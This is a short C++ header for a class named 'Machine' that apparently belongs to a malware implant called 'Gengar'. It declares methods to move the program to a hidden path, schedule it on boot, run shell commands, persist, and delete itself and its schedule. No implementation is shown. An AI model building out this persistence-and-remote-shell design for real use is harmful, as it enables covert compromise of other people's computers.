#pragma once
#include <string>
#include <vector>

class Machine
{
private:
	void MoveGengarToHiddenPath();
	void ScheduleGengarOnBoot();
	void DeleteGengar();
	void DeleteGengarSchedule();

public:
	std::string RunShellCommand(std::string);
	void Persist();
	void Suicide();
};
